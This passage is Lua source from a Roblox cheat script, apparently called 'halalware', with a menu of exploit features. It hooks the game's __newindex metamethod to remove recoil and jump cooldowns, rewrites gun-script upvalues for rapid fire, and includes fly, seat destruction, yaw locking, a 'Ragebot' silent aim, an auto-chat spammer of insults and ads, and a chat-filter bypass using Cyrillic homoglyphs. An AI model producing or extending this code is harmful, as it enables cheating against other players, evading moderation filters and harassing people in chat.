end}):AddKeyPicker("FlyKey", {Default="None",Text="Fly",NoUI=false,Callback=function()
	if not FlyConfig.Enabled then
		return;
	end
	setFlyActive(not FlyConfig.Active);
end});
FlyGroup:AddInput("FlySpeed", {Text="Speed",Default=tostring(FlyConfig.Speed),Numeric=true,Finished=true,Callback=function(val)
	local num = tonumber(val);
	if num then
		num = M.clamp(num, 0.1, 100);
		FlyConfig.Speed = num;
	end
end});
LP.CharacterAdded:Connect(function(char)
	if (FlyConfig.Enabled and FlyConfig.Active) then
		updateFly(char);
	end
end);
local NoRecoilGroup = Tabs.Misc:AddLeftGroupbox(">_<");
local noRecoilHook, originalNewIndex;
local noRecoilEnabled = false;
local function isframework(scriptInstance)
	return tostring(scriptInstance) == "Framework";
end
local function checkArgs(instance, index)
	return STR.lower(tostring(instance)):find("camera") and (tostring(index) == "CFrame");
end
local function enableNoRecoil()
	if noRecoilHook then
		return;
	end
	originalNewIndex = originalNewIndex or hookmetamethod(game, "__newindex", function(self, index, value)
		local callingScr = (getcallingscript and getcallingscript()) or nil;
		if (callingScr and isframework(callingScr) and checkArgs(self, index)) then
			return;
		end
		return originalNewIndex(self, index, value);
	end);
	noRecoilHook = true;
end
local function disableNoRecoil()
	if not noRecoilHook then
		return;
	end
	if originalNewIndex then
		hookmetamethod(game, "__newindex", originalNewIndex);
	end
	noRecoilHook = nil;
end
addToggleWithNotify(NoRecoilGroup, "No Recoil", {Text="NoRecoil",Default=false,Callback=function(v)
	noRecoilEnabled = v;
	if v then
		enableNoRecoil();
	else
		disableNoRecoil();
	end
end,Tooltip=">_<"});
local NoJumpCDGroup = Tabs.Misc:AddRightGroupbox(">_<");
local noJumpCDHook, originalNewIndexJump, currentNoJumpCDHook;
local noJumpCDEnabled = false;
local function enableNoJumpCD()
	if noJumpCDHook then
		return;
	end
	local IsA = game.IsA;
	if not originalNewIndexJump then
		originalNewIndexJump = hookmetamethod(game, "__newindex", function(self, Index, Value)
			return originalNewIndexJump(self, Index, Value);
		end);
	end
	currentNoJumpCDHook = hookmetamethod(game, "__newindex", function(self, Index, Value)
		if (not checkcaller() and IsA(self, "Humanoid") and (Index == "JumpPower")) then
			return;
		end
		return originalNewIndexJump(self, Index, Value);
	end);
	noJumpCDHook = true;
end
local function disableNoJumpCD()
	if not noJumpCDHook then
		return;
	end
	if originalNewIndexJump then
		hookmetamethod(game, "__newindex", originalNewIndexJump);
	end
	noJumpCDHook = nil;
	currentNoJumpCDHook = nil;
end
addToggleWithNotify(NoJumpCDGroup, "No Jump CD", {Text="NoJumpCD",Default=false,Callback=function(v)
	noJumpCDEnabled = v;
	if v then
		enableNoJumpCD();
	else
		disableNoJumpCD();
	end
end,Tooltip=">_<"});
local seatsInfo = {count=0,destroyed=false,defaultParents={}};
local destroySeatsConnection = nil;
addToggleWithNotify(NoJumpCDGroup, "DestroySeatsToggle", {Text="DestroySeats",Default=false,Callback=function(v)
	if v then
		seatsInfo.count = 0;
		task.spawn(function()
			local seats = {};
			for _, obj in ipairs(S.WS:GetDescendants()) do
				if (obj:IsA("Seat") or obj:IsA("VehicleSeat")) then
					table.insert(seats, obj);
					if not seatsInfo.defaultParents[obj.ClassName] then
						seatsInfo.defaultParents[obj.ClassName] = obj.Parent;
					end
				end
			end
			for _, seat in ipairs(seats) do
				pcall(function()
					if (seat and seat.Parent) then
						seat:Destroy();
						seatsInfo.count = seatsInfo.count + 1;
					end
				end);
			end
			seatsInfo.destroyed = true;
			Library:Notify(">_< on (" .. seatsInfo.count .. " seats)", 3);
		end);
		if destroySeatsConnection then
			destroySeatsConnection:Disconnect();
		end
		destroySeatsConnection = S.WS.DescendantAdded:Connect(function(obj)
			if (obj:IsA("Seat") or obj:IsA("VehicleSeat")) then
				task.wait(0.1);
				if (obj and obj.Parent) then
					if not seatsInfo.defaultParents[obj.ClassName] then
						seatsInfo.defaultParents[obj.ClassName] = obj.Parent;
					end
					obj:Destroy();
					seatsInfo.count = seatsInfo.count + 1;
				end
			end
		end);
	else
		if destroySeatsConnection then
			destroySeatsConnection:Disconnect();
			destroySeatsConnection = nil;
		end
		if seatsInfo.destroyed then
			task.spawn(function()
				local createdCount = 0;
				for className, parent in pairs(seatsInfo.defaultParents) do
					if (parent and parent:IsDescendantOf(game)) then
						local typeCount = 0;
						for _ in pairs(seatsInfo.defaultParents) do
							typeCount = typeCount + 1;
						end
						local seatsToCreate = math.min(50, math.ceil(seatsInfo.count / (((typeCount > 0) and typeCount) or 1)));
						for i = 1, seatsToCreate do
							pcall(function()
								if (parent and parent:IsDescendantOf(game)) then
									local newSeat = Instance.new(className);
									newSeat.Name = className .. i;
									newSeat.Anchored = true;
									newSeat.CanCollide = true;
									newSeat.Parent = parent;
									createdCount = createdCount + 1;
								else
									local newSeat = Instance.new(className);
									newSeat.Name = className .. i;
									newSeat.Anchored = true;
									newSeat.CanCollide = true;
									newSeat.Parent = workspace;
									createdCount = createdCount + 1;
								end
								if ((i % 10) == 0) then
									task.wait(0.01);
								end
							end);
						end
					end
				end
				Library:Notify(">_< off (" .. createdCount .. " seats)", 3);
			end);
			seatsInfo.destroyed = false;
		end
	end
end,Tooltip=">_<"});
local AntiInertiaGroup = Tabs.Misc:AddRightGroupbox(">_<");
local AntiInertiaSettings = {Enabled=false,Speed={Ground=0.3,Air=0.3},NoInertia=true};
local antiInertiaConnection = nil;
local function ToggleAntiInertia(state)
	AntiInertiaSettings.Enabled = state;
	if antiInertiaConnection then
		antiInertiaConnection:Disconnect();
		antiInertiaConnection = nil;
	end
	if state then
		antiInertiaConnection = HRT:Connect(function()
			if not AntiInertiaSettings.Enabled then
				return;
			end
			local character = LP.Character;
			if (not character or not character:FindFirstChild("HumanoidRootPart")) then
				return;
			end
			local humanoid = character:FindFirstChildOfClass("Humanoid");
			if not humanoid then
				return;
			end
			local rootPart = character.HumanoidRootPart;
			local moveDir = humanoid.MoveDirection;
			if (moveDir.Magnitude > 0) then
				local speedMult = (((humanoid:GetState() == Enum.HumanoidStateType.Freefall) or (humanoid:GetState() == Enum.HumanoidStateType.Jumping)) and AntiInertiaSettings.Speed.Air) or AntiInertiaSettings.Speed.Ground;
				local newVel = moveDir * speedMult * 50;
				if AntiInertiaSettings.NoInertia then
					rootPart.Velocity = Vector3.new(newVel.X, rootPart.Velocity.Y, newVel.Z);
				else
					local curVel = rootPart.Velocity;
					rootPart.Velocity = Vector3.new(curVel.X + ((newVel.X - curVel.X) * 0.5), rootPart.Velocity.Y, curVel.Z + ((newVel.Z - curVel.Z) * 0.5));
				end
			elseif AntiInertiaSettings.NoInertia then
				rootPart.Velocity = Vector3.new(0, rootPart.Velocity.Y, 0);
			end
		end);
	end
end
LP.CharacterAdded:Connect(function()
	if AntiInertiaSettings.Enabled then
		ToggleAntiInertia(true);
	end
end);
addToggleWithNotify(AntiInertiaGroup, "Anti Inertia", {Text="AntiInertia",Default=false,Callback=function(v)
	ToggleAntiInertia(v);
end,Tooltip=">_<"});
local YawLockerGroup = Tabs.Player:AddLeftGroupbox(">_<");
local YawLockerConfig = {Enabled=false,Angle=0,Mode="Locked",Modes={"Locked","Jitter","3 Ways","5 Ways"},AtTarget=false,DisableAutoRotate=false};
local function getYawAngles()
	local a = YawLockerConfig.Angle;
	if (YawLockerConfig.Mode == "Locked") then
		return {a};
	elseif (YawLockerConfig.Mode == "Jitter") then
		return {a,-a};
	elseif (YawLockerConfig.Mode == "3 Ways") then
		return {-a,0,a};
	elseif (YawLockerConfig.Mode == "5 Ways") then
		return {-a,(-a / 2),0,(a / 2),a};
	end
	return {a};
end
local function applyYawLockerAutoRotate()
	local char = LP.Character;
	if char then
		local hum = char:FindFirstChildOfClass("Humanoid");
		if hum then
			hum.AutoRotate = not YawLockerConfig.DisableAutoRotate;
		end
	end
end
local function setYawLocker(state)
	YawLockerConfig.Enabled = state;
	if G.yawLockerConnection then
		G.yawLockerConnection:Disconnect();
		G.yawLockerConnection = nil;
	end
	G.yawJitterState = 1;
	G.yawJitterTimer = 0;
	applyYawLockerAutoRotate();
	if state then
		G.yawLockerConnection = RND:Connect(function(dt)
			local char = LP.Character;
			if not char then
				return;
			end
			local hrp = char:FindFirstChild("HumanoidRootPart");
			if not hrp then
				return;
			end
			local myPos = hrp.Position;
			local lookVector;
			if YawLockerConfig.AtTarget then
				local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
				if (target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")) then
					local targetHrp = target.Character.HumanoidRootPart;
					local directionToTarget = targetHrp.Position - myPos;
					local baseYaw = M.atan2(directionToTarget.X, directionToTarget.Z);
					local angles = getYawAngles();
					local finalYaw;
					if (YawLockerConfig.Mode == "Jitter") then
						G.yawJitterTimer = G.yawJitterTimer + dt;
						if (G.yawJitterTimer > 0.1) then
							G.yawJitterState = 3 - G.yawJitterState;
							G.yawJitterTimer = 0;
						end
						finalYaw = baseYaw + M.rad(angles[G.yawJitterState]);
					elseif (YawLockerConfig.Mode == "3 Ways") then
						G.yawJitterTimer = G.yawJitterTimer + dt;
						if (G.yawJitterTimer > 0.15) then
							G.yawJitterState = (G.yawJitterState % 3) + 1;
							G.yawJitterTimer = 0;
						end
						finalYaw = baseYaw + M.rad(angles[G.yawJitterState]);
					elseif (YawLockerConfig.Mode == "5 Ways") then
						G.yawJitterTimer = G.yawJitterTimer + dt;
						if (G.yawJitterTimer > 0.12) then
							G.yawJitterState = (G.yawJitterState % 5) + 1;
							G.yawJitterTimer = 0;
						end
						finalYaw = baseYaw + M.rad(angles[G.yawJitterState]);
					else
						finalYaw = baseYaw + M.rad(angles[1]);
					end
					lookVector = Vector3.new(M.sin(finalYaw), 0, M.cos(finalYaw));
				end
			else
				local angles = getYawAngles();
				local yaw;
				if (YawLockerConfig.Mode == "Locked") then
					yaw = M.rad(angles[1]);
				elseif (YawLockerConfig.Mode == "Jitter") then
					G.yawJitterTimer = G.yawJitterTimer + dt;
					if (G.yawJitterTimer > 0.1) then
						G.yawJitterState = 3 - G.yawJitterState;
						G.yawJitterTimer = 0;
					end
					yaw = M.rad(angles[G.yawJitterState]);
				elseif (YawLockerConfig.Mode == "3 Ways") then
					G.yawJitterTimer = G.yawJitterTimer + dt;
					if (G.yawJitterTimer > 0.15) then
						G.yawJitterState = (G.yawJitterState % 3) + 1;
						G.yawJitterTimer = 0;
					end
					yaw = M.rad(angles[G.yawJitterState]);
				elseif (YawLockerConfig.Mode == "5 Ways") then
					G.yawJitterTimer = G.yawJitterTimer + dt;
					if (G.yawJitterTimer > 0.12) then
						G.yawJitterState = (G.yawJitterState % 5) + 1;
						G.yawJitterTimer = 0;
					end
					yaw = M.rad(angles[G.yawJitterState]);
				else
					yaw = M.rad(YawLockerConfig.Angle);
				end
				lookVector = Vector3.new(M.sin(yaw), 0, M.cos(yaw));
			end
			if lookVector then
				hrp.CFrame = CFrame.new(myPos, myPos + lookVector);
			end
		end);
	end
end
addToggleWithNotify(YawLockerGroup, "YawLocker", {Text="YawLock",Default=false,Callback=function(v)
	setYawLocker(v);
end,Tooltip=">_<"});
YawLockerGroup:AddDropdown("YawLockerMode", {Text="Mode",Values=YawLockerConfig.Modes,Default="Locked",Callback=function(val)
	YawLockerConfig.Mode = val;
	yawJitterState = 1;
	yawJitterTimer = 0;
end,Tooltip=">_<"});
YawLockerGroup:AddSlider("YawLockerAngle", {Text="Angle",Default=0,Min=0,Max=360,Rounding=0,Callback=function(val)
	YawLockerConfig.Angle = val;
end,Tooltip=">_<"});
YawLockerGroup:AddToggle("YawLockerAtTarget", {Text="AtTarget",Default=false,Callback=function(v)
	YawLockerConfig.AtTarget = v;
end,Tooltip=">_<"});
YawLockerGroup:AddToggle("YawLockerDisableAutoRotate", {Text="DisableAutoRotate",Default=false,Callback=function(v)
	YawLockerConfig.DisableAutoRotate = v;
	applyYawLockerAutoRotate();
end,Tooltip=">_<"});
LP.CharacterAdded:Connect(function(char)
	if (YawLockerConfig.Enabled or YawLockerConfig.DisableAutoRotate) then
		applyYawLockerAutoRotate();
	end
end);
local AnimBreakerGroup = Tabs.Player:AddRightGroupbox(">_<");
getgenv().AnimBreakerSettings = {enabled=false,delayTime=0.4,stepSize=0.4,customAnimEnabled=false,customAnimId="10714340543",persistAfterDeath=true};
getgenv().animBreakerTracks = {};
getgenv().animBreakerAnimatorConn = nil;
getgenv().animBreakerHeartbeatConn = nil;
getgenv().animBreakerCoroutine = nil;
getgenv().customAnimCoroutine = nil;
getgenv().deathConnection = nil;
getgenv().respawnConnection = nil;
function freezeAnimBreakerTrack(track)
	if (not track or not track.IsPlaying) then
		return;
	end
	track:AdjustSpeed(0);
	getgenv().animBreakerTracks[track] = true;
end
function restoreAnimations(character)
	local humanoid = character and character:FindFirstChildOfClass("Humanoid");
	if not humanoid then
		return;
	end
	local animator = humanoid:FindFirstChildOfClass("Animator");
	if not animator then
		return;
	end
	for _, track in pairs(animator:GetPlayingAnimationTracks()) do
		if getgenv().animBreakerTracks[track] then
			track:AdjustSpeed(1);
			getgenv().animBreakerTracks[track] = nil;
		end
	end
	if getgenv().animBreakerAnimatorConn then
		getgenv().animBreakerAnimatorConn:Disconnect();
		getgenv().animBreakerAnimatorConn = nil;
	end
	if humanoid:FindFirstChild("Animate") then
		humanoid.Animate.Disabled = false;
	end
end
function playCustomAnimation(character, withLags)
	if not character then
		return;
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid");
	if not humanoid then
		return;
	end
	if (not getgenv().deathConnection and humanoid) then
		getgenv().deathConnection = humanoid.Died:Connect(function()
			local deadCharacter = character;
			task.spawn(function()
				if (getgenv().AnimBreakerSettings.customAnimEnabled and deadCharacter) then
					local animator = deadCharacter:FindFirstChildOfClass("Humanoid") and deadCharacter:FindFirstChildOfClass("Humanoid"):FindFirstChildOfClass("Animator");
					if animator then
						local animation = Instance.new("Animation");
						animation.AnimationId = "rbxassetid://" .. getgenv().AnimBreakerSettings.customAnimId;
						pcall(function()
							local track = animator:LoadAnimation(animation);
							if track then
								track:Play();
								track.Looped = true;
							end
						end);
					end
				end
			end);
			task.spawn(function()
				task.wait(1);
				if getgenv().AnimBreakerSettings.customAnimEnabled then
					local newCharacter = LP.Character or LP.CharacterAdded:Wait();
					if (newCharacter and (newCharacter ~= deadCharacter)) then
						playCustomAnimation(newCharacter, getgenv().AnimBreakerSettings.enabled);
					end
				end
			end);
		end);
	end
	local animator = humanoid:FindFirstChildOfClass("Animator");
	if not animator then
		return;
	end
	if getgenv().customAnimCoroutine then
		task.cancel(getgenv().customAnimCoroutine);
		getgenv().customAnimCoroutine = nil;
	end
	getgenv().customAnimCoroutine = task.spawn(function()
		local animation = Instance.new("Animation");
		animation.AnimationId = "rbxassetid://" .. getgenv().AnimBreakerSettings.customAnimId;
		local animTrack = nil;
		pcall(function()
			animTrack = animator:LoadAnimation(animation);
		end);
		if not animTrack then
			task.wait(0.1);
			pcall(function()
				animTrack = animator:LoadAnimation(animation);
			end);
		end
		if animTrack then
			animTrack:Play();
			if withLags then
				task.spawn(function()
					while animTrack.IsPlaying and getgenv().AnimBreakerSettings.customAnimEnabled do
						pcall(function()
							animTrack:AdjustSpeed(math.random(5, 20) / 10);
							if (math.random() > 0.5) then
								animTrack.TimePosition = math.random() * animTrack.Length;
							end
						end);
						task.wait(math.random(5, 15) / 100);
					end
				end);
			else
				animTrack:AdjustSpeed(1);
				animTrack.Looped = true;
			end
		else
			pcall(function()
				if game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent") then
					local args = {[1]="PlayAnimation",[2]=("rbxassetid://" .. getgenv().AnimBreakerSettings.customAnimId)};
					local mainEvent = game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent");
					if mainEvent then
						mainEvent:FireServer(unpack(args));
					end
				end
			end);
		end
	end);
end
function setupAnimBreakerCharacter(character)
	if not getgenv().AnimBreakerSettings.enabled then
		return;
	end
	local humanoid = character:WaitForChild("Humanoid");
	local animator = humanoid:WaitForChild("Animator");
	table.clear(getgenv().animBreakerTracks);
	for _, track in pairs(animator:GetPlayingAnimationTracks()) do
		freezeAnimBreakerTrack(track);
	end
	if getgenv().animBreakerAnimatorConn then
		getgenv().animBreakerAnimatorConn:Disconnect();
	end
	getgenv().animBreakerAnimatorConn = animator.AnimationPlayed:Connect(freezeAnimBreakerTrack);
end
function toggleAnimBreaker(state)
	getgenv().AnimBreakerSettings.enabled = state;
	if getgenv().animBreakerHeartbeatConn then
		getgenv().animBreakerHeartbeatConn:Disconnect();
		getgenv().animBreakerHeartbeatConn = nil;
	end
	if state then
		if LP.Character then
			setupAnimBreakerCharacter(LP.Character);
		end
		getgenv().animBreakerHeartbeatConn = HRT:Connect(function()
			for track in pairs(getgenv().animBreakerTracks) do
				if (track and track.IsPlaying) then
					track:AdjustSpeed(0);
				else
					getgenv().animBreakerTracks[track] = nil;
				end
			end
		end);
		task.spawn(function()
			while getgenv().AnimBreakerSettings.enabled do
				for track in pairs(getgenv().animBreakerTracks) do
					if (track and track.IsPlaying) then
						pcall(function()
							track.TimePosition = track.TimePosition + getgenv().AnimBreakerSettings.stepSize;
						end);
					end
				end
				task.wait(getgenv().AnimBreakerSettings.delayTime);
			end
		end);
	elseif LP.Character then
		restoreAnimations(LP.Character);
	end
	updateCustomAnimationState();
end
function toggleCustomAnimation(state)
	getgenv().AnimBreakerSettings.customAnimEnabled = state;
	if getgenv().deathConnection then
		getgenv().deathConnection:Disconnect();
		getgenv().deathConnection = nil;
	end
	if (state and LP.Character) then
		local withLags = getgenv().AnimBreakerSettings.enabled;
		playCustomAnimation(LP.Character, withLags);
	else
		if getgenv().customAnimCoroutine then
			task.cancel(getgenv().customAnimCoroutine);
			getgenv().customAnimCoroutine = nil;
		end
		for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
			if player.Character then
				local humanoid = player.Character:FindFirstChildOfClass("Humanoid");
				if humanoid then
					local animator = humanoid:FindFirstChildOfClass("Animator");
					if animator then
						for _, track in pairs(animator:GetPlayingAnimationTracks()) do
							if (track.Animation and track.Animation.AnimationId and track.Animation.AnimationId:find(getgenv().AnimBreakerSettings.customAnimId)) then
								track:Stop();
							end
						end
					end
				end
			end
		end
	end
end
function updateCustomAnimationState()
	if (getgenv().AnimBreakerSettings.customAnimEnabled and LP.Character) then
		local withLags = getgenv().AnimBreakerSettings.enabled;
		local humanoid = LP.Character:FindFirstChildOfClass("Humanoid");
		if humanoid then
			local animator = humanoid:FindFirstChildOfClass("Animator");
			if animator then
				for _, track in pairs(animator:GetPlayingAnimationTracks()) do
					if (track.Animation and track.Animation.AnimationId and track.Animation.AnimationId:find(getgenv().AnimBreakerSettings.customAnimId)) then
						track:Stop();
					end
				end
			end
		end
		playCustomAnimation(LP.Character, withLags);
	end
end
getgenv().respawnConnection = LP.CharacterAdded:Connect(function(character)
	if getgenv().AnimBreakerSettings.enabled then
		setupAnimBreakerCharacter(character);
	end
	if getgenv().AnimBreakerSettings.customAnimEnabled then
		task.wait(0.5);
		playCustomAnimation(character, getgenv().AnimBreakerSettings.enabled);
	end
end);
addToggleWithNotify(AnimBreakerGroup, "AnimBreaker", {Text="AnimBreaker",Default=false,Callback=function(v)
	toggleAnimBreaker(v);
end,Tooltip=">_<"});
addToggleWithNotify(AnimBreakerGroup, "CustomAnimation", {Text="CustomAnim",Default=false,Callback=function(v)
	toggleCustomAnimation(v);
end,Tooltip=">_<"});
local RapidFireGunScriptGroup = Tabs.Player:AddRightGroupbox(">_<");
local Traced = {RapidFire=false};
local Orginal = {};
local rapidFireGunScriptConn = nil;
local function enableRapidFireGunScript()
	if rapidFireGunScriptConn then
		rapidFireGunScriptConn:Disconnect();
	end
	local lastToolCheck = 0;
	local toolCheckInterval = 0.2;
	local currentTool = nil;
	local isOptimizing = false;
	rapidFireGunScriptConn = HRT:Connect(function()
		local now = tick();
		if (((now - lastToolCheck) < toolCheckInterval) and currentTool) then
			return;
		end
		lastToolCheck = now;
		local tool = LP.Character and LP.Character:FindFirstChildOfClass("Tool");
		if (tool == currentTool) then
			return;
		end
		currentTool = tool;
		if isOptimizing then
			return;
		end
		task.spawn(function()
			isOptimizing = true;
			if (tool and tool:FindFirstChild("GunScript")) then
				for _, connection in ipairs(getconnections(tool.Activated)) do
					local func = connection.Function;
					if func then
						local funcInfo = debug.getinfo(func);
						for i = 1, funcInfo.nups do
							local c, n = debug.getupvalue(func, i);
							if (type(c) == "number") then
								if not Orginal[i] then
									Orginal[i] = c;
								end
								debug.setupvalue(func, i, (Traced.RapidFire and 1e-20) or Orginal[i]);
							end
						end
					end
				end
			end
			isOptimizing = false;
		end);
	end);
	Traced.RapidFire = true;
end
local function disableRapidFireGunScript()
	if rapidFireGunScriptConn then
		rapidFireGunScriptConn:Disconnect();
		rapidFireGunScriptConn = nil;
	end
	Traced.RapidFire = false;
end
addToggleWithNotify(RapidFireGunScriptGroup, "RapidFireGunScript", {Text="RapidFireGunScript",Default=false,Callback=function(v)
	if v then
		enableRapidFireGunScript();
	else
		disableRapidFireGunScript();
	end
end,Tooltip=">_<"});
local RapidFireM1Group = Tabs.Player:AddRightGroupbox(">_<");
local function rapidFireM1SafeActivate(tool)
	if (not G.rapidFireM1Debounce and tool and tool:IsA("Tool")) then
		G.rapidFireM1Debounce = true;
		pcall(function()
			tool:Activate();
		end);
		task.wait(G.rapidFireM1MinDelay);
		G.rapidFireM1Debounce = false;
	end
end
local function rapidFireM1FireLoop()
	while G.rapidFireM1Firing do
		local character = LP.Character;
		if character then
			local tool = character:FindFirstChildOfClass("Tool");
			rapidFireM1SafeActivate(tool);
		end
		HRT:Wait();
	end
end
local function rapidFireM1SetupCharacter(character)
	if G.rapidFireM1CharConn then
		G.rapidFireM1CharConn:Disconnect();
	end
	G.rapidFireM1CharConn = character.ChildAdded:Connect(function(child)
		if child:IsA("Tool") then
			child.Activated:Connect(function()
				if G.rapidFireM1Firing then
					rapidFireM1SafeActivate(child);
				end
			end);
		end
	end);
end
local function enableRapidFireM1()
	if G.rapidFireM1ConnBegan then
		G.rapidFireM1ConnBegan:Disconnect();
	end
	if G.rapidFireM1ConnEnded then
		G.rapidFireM1ConnEnded:Disconnect();
	end
	G.rapidFireM1ConnBegan = S.UIS.InputBegan:Connect(function(input, gp)
		if (not gp and (input.UserInputType == Enum.UserInputType.MouseButton1)) then
			G.rapidFireM1Firing = true;
			rapidFireM1FireLoop();
		end
	end);
	G.rapidFireM1ConnEnded = S.UIS.InputEnded:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1) then
			G.rapidFireM1Firing = false;
		end
	end);
	if LP.Character then
		rapidFireM1SetupCharacter(LP.Character);
	end
	LP.CharacterAdded:Connect(function(character)
		character:WaitForChild("Humanoid");
		rapidFireM1SetupCharacter(character);
	end);
end
local function disableRapidFireM1()
	if G.rapidFireM1ConnBegan then
		G.rapidFireM1ConnBegan:Disconnect();
		G.rapidFireM1ConnBegan = nil;
	end
	if G.rapidFireM1ConnEnded then
		G.rapidFireM1ConnEnded:Disconnect();
		G.rapidFireM1ConnEnded = nil;
	end
	if G.rapidFireM1CharConn then
		G.rapidFireM1CharConn:Disconnect();
		G.rapidFireM1CharConn = nil;
	end
	G.rapidFireM1Firing = false;
end
addToggleWithNotify(RapidFireM1Group, "RapidFireM1Spam", {Text="RapidFireM1",Default=false,Callback=function(v)
	if v then
		enableRapidFireM1();
	else
		disableRapidFireM1();
	end
end,Tooltip=">_<"});
local MiscUtilsGroup = Tabs.Misc:AddLeftGroupbox(">_<");
local FOVGroup = Tabs.Misc:AddRightGroupbox(">_<");
local FOVConfig = {Enabled=false,Value=70};
addToggleWithNotify(FOVGroup, "FOVEnabled", {Text="FOV",Default=false,Callback=function(v)
	FOVConfig.Enabled = v;
	if v then
		game:GetService("Workspace").CurrentCamera.FieldOfView = FOVConfig.Value;
	else
		game:GetService("Workspace").CurrentCamera.FieldOfView = 70;
	end
end,Tooltip=">_<"});
FOVGroup:AddSlider("FOVValue", {Text="FOV Value",Default=70,Min=10,Max=1000,Rounding=0,Step=10,Callback=function(v)
	FOVConfig.Value = v;
	if FOVConfig.Enabled then
		game:GetService("Workspace").CurrentCamera.FieldOfView = v;
	end
end,Tooltip=">_<"});
local fovConnection;
fovConnection = game:GetService("RunService").RenderStepped:Connect(function()
	if FOVConfig.Enabled then
		game:GetService("Workspace").CurrentCamera.FieldOfView = FOVConfig.Value;
	end
end);
local TalkGroup = Tabs.Misc:AddRightGroupbox(">_<");
G.AutoTalk = {enabled=false,talkType="TrashTalk",interval=5,connection=nil,targetInRadiusOnly=false,phrases={TrashTalk={"ez kid","ur bad","get better","u need to see ur monitor btw","imagine losing","clown down","ur mom","go cry","trash","zzzzz"},AdTalk={"halalware on top","get halal, lame","get halalware or lose again","imagine not using halal","halalware > all","halalware the best","halalware never loses","atleast better then ur script","halalware user = godness","halalware = win"}}};
G.isTargetInRadius = function(radius)
	local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
	if (not target or not target.Character) then
		return false;
	end
	local targetHRP = target.Character:FindFirstChild("HumanoidRootPart");
	if not targetHRP then
		return false;
	end
	local character = LP.Character;
	if not character then
		return false;
	end
	local localHRP = character:FindFirstChild("HumanoidRootPart");
	if not localHRP then
		return false;
	end
	local distance = (localHRP.Position - targetHRP.Position).Magnitude;
	return distance <= radius;
end;
G.sendRandomTalkMessage = function()
	if G.AutoTalk.targetInRadiusOnly then
		if not G.isTargetInRadius(100) then
			return;
		end
	end
	local phrases = G.AutoTalk.phrases[G.AutoTalk.talkType];
	if (not phrases or (#phrases == 0)) then
		return;
	end
	local randomIndex = math.random(1, #phrases);
	local message = phrases[randomIndex];
	G.sendMsg(message);
end;
G.toggleAutoTalk = function(state)
	G.AutoTalk.enabled = state;
	if G.AutoTalk.connection then
		G.AutoTalk.connection:Disconnect();
		G.AutoTalk.connection = nil;
	end
	if state then
		G.AutoTalk.connection = task.spawn(function()
			while G.AutoTalk.enabled do
				G.sendRandomTalkMessage();
				task.wait(G.AutoTalk.interval);
			end
		end);
		Library:Notify(">_< Talk on", 3);
	else
		Library:Notify(">_< Talk off", 3);
	end
end;
addToggleWithNotify(TalkGroup, "AutoTalkEnabled", {Text="Talk",Default=false,Callback=function(v)
	G.toggleAutoTalk(v);
end,Tooltip=">_<"});
TalkGroup:AddDropdown("AutoTalkType", {Text="Type",Values={"TrashTalk","AdTalk"},Default="TrashTalk",Multi=false,Callback=function(v)
	G.AutoTalk.talkType = v;
end,Tooltip=">_<"});
TalkGroup:AddSlider("AutoTalkInterval", {Text="Interval (s)",Default=5,Min=1,Max=10,Rounding=0,Callback=function(v)
	G.AutoTalk.interval = v;
end,Tooltip=">_<"});
addToggleWithNotify(TalkGroup, "AutoTalkTargetInRadius", {Text="IfTargetInRadius100",Default=false,Callback=function(v)
	G.AutoTalk.targetInRadiusOnly = v;
end,Tooltip=">_<"});
local ChatBypassGroup = Tabs.Misc:AddLeftGroupbox(">_<");
G.ChatBypass = {letterMap={o="о",i="і",l="ӏ",p="р",a="а"},cyrillicMap={["а"]="a",["е"]="e",["у"]="y",["т"]="T"},text=""};
G.styleText = function(t)
	local r = "";
	for _, c in utf8.codes(t) do
		local ch = utf8.char(c);
		if (ch == " ") then
			r = r .. "," .. string.char(30);
		else
			local newCh = G.ChatBypass.letterMap[string.lower(ch)] or G.ChatBypass.cyrillicMap[ch] or ch;
			r = r .. newCh .. "ּ";
		end
	end
	return r;
end;
G.sendMsg = function(m)
	local success, result = pcall(function()
		if (game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService) then
			game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(m, "All");
		else
			game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(m);
		end
	end);
	if not success then
		Library:Notify(">_< Error: " .. tostring(result), 3);
	end
end;
G.sendChatBypassText = function()
	if (G.ChatBypass.text and (G.ChatBypass.text ~= "")) then
		local bypassedText = G.styleText(G.ChatBypass.text);
		G.sendMsg(bypassedText);
		Library:Notify(">_<", 3);
	else
		Library:Notify(">_< No text", 3);
	end
end;
ChatBypassGroup:AddInput("ChatBypassInput", {Text="ChatBypass",Default="",Numeric=false,Finished=true,Callback=function(value)
	G.ChatBypass.text = value;
end,Tooltip=">_<"});
ChatBypassGroup:AddButton({Text="Send",Func=function()
	G.sendChatBypassText();
end,Tooltip=">_<"});
local originalFallenPartsDestroyHeight = S.WS.FallenPartsDestroyHeight;
addToggleWithNotify(MiscUtilsGroup, "DestroyVoidToggle", {Text="DestroyVoid",Default=false,Callback=function(v)
	if v then
		if (originalFallenPartsDestroyHeight == NaN) then
			originalFallenPartsDestroyHeight = -500;
		end
		S.WS.FallenPartsDestroyHeight = NaN;
		Library:Notify(">_< on", 3);
	else
		S.WS.FallenPartsDestroyHeight = originalFallenPartsDestroyHeight;
		Library:Notify(">_< off", 3);
	end
end,Tooltip=">_<"});
local SilentAimGroup = Tabs.Combat:AddLeftGroupbox(">_<");
getgenv().SilentAim = {Options={Enabled=false,Mode="Nuker",StickyKey=Enum.KeyCode.Q,AutoAir=false,MagicBullet=false,ViewTarget=false},Silent={PredictionXZ=0.12362,PredictionY=0.12362,Part="HumanoidRootPart",Offsets={Jump={Amount=0},Fall={Amount=0}}},Misc={Checks={WallCheck=false,TargetDeathCheck=false,KOCheck=false,GrabbedCheck=false,Resolver={Enabled=false,Type="Calculate CFrame"}}},MagicBullet={LastShot=0,Cooldown=0,Range=10000,IgnoreKO=false,IgnoreGrabbed=false,IgnoreForceField=true},currentTarget=nil};
addToggleWithNotify(SilentAimGroup, "SilentAimEnabled", {Text="Ragebot",Default=false,Callback=function(v)
	getgenv().SilentAim.Options.Enabled = v;
